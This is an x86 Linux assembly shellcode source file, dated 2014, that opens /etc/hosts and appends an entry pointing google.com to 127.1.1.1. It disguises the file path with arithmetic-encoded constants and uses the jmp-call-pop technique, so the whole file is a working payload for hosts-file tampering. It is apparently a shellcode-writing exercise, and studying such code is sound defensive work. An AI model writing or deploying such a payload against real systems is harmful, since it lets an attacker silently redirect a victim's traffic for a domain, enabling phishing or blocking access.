;modify_hosts.asm
;this program add a new entry in hosts file pointing google.com to 127.1.1.1 
;author Javier Tejedor
;date 24/09/2014

global _start

section .text

_start:
	xor ecx, ecx
	mul ecx
	mov al, 0x5
	push ecx

;	push 0x7374736f     ;/etc///hosts
;	push 0x682f2f2f
;	push 0x6374652f

	; subtract 0x1111 from 0x7374736f and then add 0x1111
	mov esi, 0x7374625E
	add si, 0x1111
	mov dword [esp-4], esi

	; subtract 0x1111 from 0x682f2f2f and then add 0x1111
	mov esi, 0x682F1E1E
	add si, 0x1111
	mov dword [esp-8], esi

	; subtract 0x1111 from 0x6374652f amd then add 0x1111
	mov esi, 0x6374541E
	add si, 0x1111
	mov dword [esp-12], esi

	; adjust esp
	sub esp, 12

	mov ebx, esp
	mov cx, 0x401       ;permmisions
	int 0x80        ;syscall to open file

	xchg eax, ebx
	push 0x4
	pop eax
	jmp short _load_data    ;jmp-call-pop technique to load the map

_write:
	pop ecx
	push 20         ;length of the string, dont forget to modify if changes the map
	pop edx
	int 0x80        ;syscall to write in the file

	push 0x6
	pop eax
	int 0x80        ;syscall to close the file

	push 0x1
	pop eax
	int 0x80        ;syscall to exit

_load_data:
	call _write
	google db "127.1.1.1 google.com"
